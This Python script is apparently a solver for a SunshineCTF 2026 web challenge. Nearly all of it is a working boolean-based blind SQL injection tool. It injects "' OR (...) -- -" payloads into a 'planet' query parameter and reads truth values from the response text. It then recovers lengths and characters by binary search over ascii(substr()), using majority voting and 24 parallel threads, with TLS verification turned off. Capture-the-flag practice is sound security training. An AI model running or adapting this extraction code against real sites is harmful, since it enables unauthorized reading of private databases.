#!/usr/bin/env python3
import requests, sys, time
from concurrent.futures import ThreadPoolExecutor
import urllib3; urllib3.disable_warnings()

B = "https://planetary.web.2026.sunshinectf.games/probe"

_tl = __import__("threading").local()
def sess():
    s = getattr(_tl, "s", None)
    if s is None:
        s = requests.Session(); s.verify = False
        _tl.s = s
    return s

def truth(cond):
    payload = "' OR (" + cond + ") -- -"
    last = None
    for _ in range(8):
        try:
            r = sess().get(B, params={"planet": payload}, timeout=25)
            return "is-carrier" in r.text
        except Exception as e:
            last = e; time.sleep(0.5)
    raise RuntimeError(f"request failed: {cond} :: {last}")

def vtruth(cond, n=3):
    # best-of-n majority vote
    yes = 0
    for k in range(n):
        if truth(cond):
            yes += 1
    return yes*2 > n

def count(expr, cap=100000):
    lo, hi = 0, 1
    while hi < cap and vtruth(f"({expr})>{hi}"):
        hi *= 2
    while lo < hi:
        mid = (lo+hi)//2
        if vtruth(f"({expr})>{mid}"):
            lo = mid+1
        else:
            hi = mid
    return lo

def _char(subq, i):
    cexpr = f"ascii(substr(({subq}),{i},1))"
    for attempt in range(5):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo+hi)//2
            if truth(f"({cexpr})>{mid}"):
                lo = mid+1
            else:
                hi = mid
        # confirm candidate with a single equality check
        if truth(f"({cexpr})={lo}"):
            return i, chr(lo)
    return i, chr(lo)  # best effort

def extract_str(subq, workers=24):
    ln = count(f"SELECT length(({subq}))")
    if ln == 0:
        print("(empty/null)"); return ""
    res = [None]*ln
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for i, c in ex.map(lambda i: _char(subq, i), range(1, ln+1)):
            res[i-1] = c
    s = "".join(res)
    print(f"[len={ln}] {s}")
    return s

if __name__ == "__main__":
    print("sanity", truth("1=1"), truth("1=2"))
